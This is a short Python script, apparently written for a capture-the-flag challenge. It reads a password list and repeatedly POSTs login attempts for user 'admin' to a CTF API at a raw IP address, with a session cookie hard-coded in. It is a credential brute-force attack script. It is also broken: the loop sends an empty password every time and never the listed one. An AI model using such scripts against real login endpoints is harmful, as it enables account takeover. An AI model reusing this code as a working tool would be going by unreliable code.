import requests
import json

headers = {
    'Content-Type': 'application/json',
    'User-Agent': 'bilibili Security Browser',
    'Cookie': 'session=eyJ1aWQiOiI1MjA0NjYifQ.X5O1Gg.ieXSEwkmXgqYRjhLTF1o27FeMoQ'
}


def main():
    file = open('pwd.txt', 'r', encoding='utf-8')
    pwd = file.read().split('\n')

    for p in pwd:
        res = requests.post('http://45.113.201.36/api/ctf/3', data=json.dumps(
            {
                'username': 'admin',
                'passwd': ''
            }
        ), headers=headers)
        if res.status_code == 200:
            try:
                if res.json()['code'] == 200:
                    print(res.json())
            except:
                print(res.content)


if __name__ == '__main__':
    main()
